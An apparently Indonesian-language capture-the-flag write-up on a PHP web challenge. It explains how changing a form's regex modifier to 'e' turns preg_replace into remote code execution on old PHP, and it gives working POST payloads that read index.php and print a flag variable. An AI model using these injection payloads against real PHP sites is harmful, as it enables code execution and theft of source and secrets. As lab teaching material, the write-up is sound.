Pertama kita disuguhkan sebuah Web Untuk Replacement String

![](/pcre/index.png)


Seperti itulah tampilanya. Ada mbak mbak cantik.

Pertama menurut clue, Bug ini terdapat pada versi `< 7 ` jadi pada versi `7` kebawah. Setelah browsing dan mendapat pencerahan pada atikel ini

https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace


Disitu kida mendapatkan RCE jika mengisi Mod FLag dengan `e` dan `replacement` berisi kode kita

Setelah melihat dengan view source beberapa source memungkinkan bisa dilakukanya RCE

```
 <form action="" method="post">
                <input type="text" name="search" placeholder="Search For Replace"><br>
                <select name="mod">
                        <option value="i">Caseless</option>
                        <option value="m">Multiline</option>
                        <option value="s">Dot All</option>
                        <option value="x">Extended</option>
                </select><br>
                <input type="text" name="replacement" placeholder="Replace With"><br>
                <input type="text" name="subject" placeholder="Subject"><br>
                <button type="submit" name="submit">replace</button>
        </form>
```

Pada select `mod` kita bisa menginspect element salah satu value menjadi `e` dan pada `replacement` kita bisa mengisi dengan PHP code.

Tapi kita TIDAK bisa memasukan shell function seperti `system,shell_exec,dll` oke, Berati kita hanya boleh melakukan `php code exec murni` jadi payload saya seperti ini.

```
search=asd&mod=e&replacement=file_get_contents%28%22index.php%22%29%3B&subject=asdf&submit=
```

Dan didapatkan source dari index dan berisi flag juga.

Kita juga dapat mengunakan banyak fungsi seperti

```
-show_source
-fopen
-print
```

Jika mengunakan payload ini kita harus bisa menebak dimana Flag didefine


```
$searc = "(.*)";
$replacement = 'print("\\1")';
$subject = '$flag';
```
 
 Dan masih banyak lagi payload payload lain yang bisa digunakan! Jika kalian ingin mencoba sendiri silahkan upload index.php pada local kalian dan pastikan versi php kalian 5.6 atau kurang
 
 Source Asli Dibuat oleh `Reyvand` dan diedit Oleh Penulis
 
 Nikko Enggaliano
